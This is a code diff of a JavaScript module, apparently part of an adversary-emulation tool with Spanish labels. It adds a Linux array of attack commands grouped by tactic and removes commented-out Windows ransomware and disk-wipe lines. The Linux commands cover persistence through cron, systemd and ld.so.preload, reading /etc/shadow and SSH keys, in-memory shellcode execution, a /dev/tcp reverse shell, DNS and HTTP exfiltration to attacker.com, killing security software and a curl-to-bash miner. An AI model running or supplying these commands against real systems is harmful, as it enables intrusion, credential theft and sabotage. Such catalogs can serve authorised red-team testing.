@@ -1,4 +1,4 @@
-const operationsArray = [
+const windowsOperationsArray = [
   // Persistence
   {
     category: 'Persistencia',
@@ -227,18 +227,238 @@ const operationsArray = [
     command: 'netsh advfirewall set allprofiles state off',
     type: 'external',
   },
-/*   {
-    category: 'Impacto',
-    name: 'Ransomware Simulation',
-    command: 'Get-ChildItem -Path \"C:\\\" -Recurse -File | Where-Object { $_.Extension -notin @(\".exe\",\".dll\",\".sys\") } | ForEach-Object { [System.IO.File]::Encrypt($_.FullName) }',
-    type: 'external',
-  }, */
-/*   {
-    category: 'Impacto',
-    name: 'Data Destruction',
-    command: 'cipher /w:C:\\',
-    type: 'external',
-  } */
+
 ];
 
-export { operationsArray }
+
+const linuxOperationsArray = [
+  // Persistencia
+  {
+    category: 'Persistencia',
+    name: 'Archivo de inicio (.bashrc)',
+    command: 'echo "python3 /path/to/payload.py &" >> ~/.bashrc',
+    type: 'external',
+  },
+  {
+    category: 'Persistencia',
+    name: 'Cron Job',
+    command: '(crontab -l 2>/dev/null; echo "*/5 * * * * python3 /path/to/payload.py") | crontab -',
+    type: 'external',
+  },
+  {
+    category: 'Persistencia',
+    name: 'Servicio Systemd',
+    command: 'echo -e "[Unit]\\nDescription=Custom Service\\n\\n[Service]\\nExecStart=/usr/bin/python3 /path/to/payload.py\\nRestart=always\\n\\n[Install]\\nWantedBy=multi-user.target" > /etc/systemd/system/malicious.service && systemctl enable malicious.service',
+    type: 'external',
+  },
+  {
+    category: 'Persistencia',
+    name: 'LD_PRELOAD Hijacking',
+    command: 'echo "/path/to/malicious_lib.so" > /etc/ld.so.preload',
+    type: 'external',
+  },
+
+  // Escalada de Privilegios
+  {
+    category: 'Escalada de Privilegios',
+    name: 'SUID Binaries',
+    command: 'find / -perm -4000 -type f 2>/dev/null',
+    type: 'external',
+  },
+  {
+    category: 'Escalada de Privilegios',
+    name: 'Capabilities',
+    command: 'getcap -r / 2>/dev/null',
+    type: 'external',
+  },
+  {
+    category: 'Escalada de Privilegios',
+    name: 'Kernel Exploits',
+    command: 'uname -a && cat /etc/os-release',
+    type: 'external',
+  },
+  {
+    category: 'Escalada de Privilegios',
+    name: 'Docker Escape',
+    command: 'docker --version && cat /proc/self/cgroup | grep -i docker',
+    type: 'external',
+  },
+  {
+    category: 'Escalada de Privilegios',
+    name: 'Password Hunting',
+    command: 'find / -name "*.php" -o -name "*.conf" -o -name "*.cnf" -o -name "*.ini" -o -name "*.env" -type f -exec grep -i "password" {} \\; 2>/dev/null',
+    type: 'external',
+  },
+
+  // Evasión de AV/EDR
+  {
+    category: 'Evasión de AV/EDR',
+    name: 'Ofuscación básica',
+    command: 'python3 -c "import base64; exec(base64.b64decode(\'<base64_payload>\').decode(\'utf-8\'))"',
+    type: 'external',
+  },
+  {
+    category: 'Evasión de AV/EDR',
+    name: 'Memory Execution',
+    command: 'python3 -c "import ctypes; libc = ctypes.CDLL(None); shellcode = b\'\\x90\\x90...\'; libc.mprotect(shellcode, len(shellcode), 0x7); (ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))()"',
+    type: 'external',
+  },
+  {
+    category: 'Evasión de AV/EDR',
+    name: 'Process Injection',
+    command: 'gcc -shared -o inject.so -fPIC inject.c && LD_PRELOAD=./inject.so /bin/ls',
+    type: 'external',
+  },
+  {
+    category: 'Evasión de AV/EDR',
+    name: 'Syscall Directo',
+    command: 'gcc -o syscall_exec syscall_exec.c && ./syscall_exec',
+    type: 'external',
+  },
+
+  // Recolección de Credenciales
+  {
+    category: 'Recolección de Credenciales',
+    name: 'Historial de Bash',
+    command: 'cat ~/.bash_history | grep -i "pass"',
+    type: 'external',
+  },
+  {
+    category: 'Recolección de Credenciales',
+    name: 'Archivos de Configuración',
+    command: 'find / -name "*config*" -o -name "*credential*" -type f -exec grep -i "pass" {} \\; 2>/dev/null',
+    type: 'external',
+  },
+  {
+    category: 'Recolección de Credenciales',
+    name: 'Dump de Memoria',
+    command: 'gcore -o /tmp/dump <PID>',
+    type: 'download',
+  },
+  {
+    category: 'Recolección de Credenciales',
+    name: 'Credenciales de SSH',
+    command: 'cat ~/.ssh/id_rsa && cat ~/.ssh/known_hosts',
+    type: 'download',
+  },
+  {
+    category: 'Recolección de Credenciales',
+    name: 'Shadow File',
+    command: 'cat /etc/shadow',
+    type: 'download',
+  },
+
+  // Movimiento Lateral
+  {
+    category: 'Movimiento Lateral',
+    name: 'SSH con Clave',
+    command: 'ssh -i /path/to/key user@target',
+    type: 'external',
+  },
+  {
+    category: 'Movimiento Lateral',
+    name: 'SSH Pass',
+    command: 'sshpass -p "password" ssh user@target',
+    type: 'external',
+  },
+  {
+    category: 'Movimiento Lateral',
+    name: 'SCP Transfer',
+    command: 'scp /path/to/file user@target:/remote/path',
+    type: 'external',
+  },
+  {
+    category: 'Movimiento Lateral',
+    name: 'Cron Job Remoto',
+    command: 'ssh user@target \'(crontab -l 2>/dev/null; echo "*/5 * * * * python3 /path/to/payload.py") | crontab -\'',
+    type: 'external',
+  },
+
+  // Reconocimiento
+  {
+    category: 'Reconocimiento',
+    name: 'Información del Sistema',
+    command: 'uname -a && cat /etc/*release && lscpu && free -h',
+    type: 'external',
+  },
+  {
+    category: 'Reconocimiento',
+    name: 'Usuarios y Grupos',
+    command: 'cat /etc/passwd && cat /etc/group',
+    type: 'external',
+  },
+  {
+    category: 'Reconocimiento',
+    name: 'Conexiones de Red',
+    command: 'ss -tulnp && netstat -antup',
+    type: 'external',
+  },
+  {
+    category: 'Reconocimiento',
+    name: 'Procesos en Ejecución',
+    command: 'ps aux | grep -v "\["',
+    type: 'external',
+  },
+
+  // Comando y Control
+  {
+    category: 'Comando y Control',
+    name: 'Reverse Shell',
+    command: 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1',
+    type: 'external',
+  },
+  {
+    category: 'Comando y Control',
+    name: 'DNS Beacon',
+    command: 'dig +short $(whoami).$(hostname).attacker.com',
+    type: 'external',
+  },
+  {
+    category: 'Comando y Control',
+    name: 'ICMP C2',
+    command: 'ping -c 1 -p $(echo "COMMAND" | xxd -p) ATTACKER_IP',
+    type: 'external',
+  },
+
+  // Exfiltración
+  {
+    category: 'Exfiltración',
+    name: 'Compresión de Datos',
+    command: 'tar czf /tmp/data.tar.gz /path/to/sensitive/data',
+    type: 'external',
+  },
+  {
+    category: 'Exfiltración',
+    name: 'Transferencia HTTP',
+    command: 'curl -X POST -F "file=@/path/to/file" http://attacker.com/upload',
+    type: 'external',
+  },
+  {
+    category: 'Exfiltración',
+    name: 'Exfiltración DNS',
+    command: 'for part in $(cat /path/to/file | xxd -p -c 16); do dig +short $part.attacker.com; done',
+    type: 'external',
+  },
+
+  // Impacto
+  {
+    category: 'Impacto',
+    name: 'Deshabilitar Firewall',
+    command: 'ufw disable || systemctl stop firewalld',
+    type: 'external',
+  },
+  {
+    category: 'Impacto',
+    name: 'Kill Processes',
+    command: 'pkill -f "security|av|edr"',
+    type: 'external',
+  },
+  {
+    category: 'Impacto',
+    name: 'Crypto Miner',
+    command: 'curl -s http://attacker.com/xmrig | bash -s WALLET_ADDRESS',
+    type: 'external',
+  }
+];
+
+export { windowsOperationsArray, linuxOperationsArray }
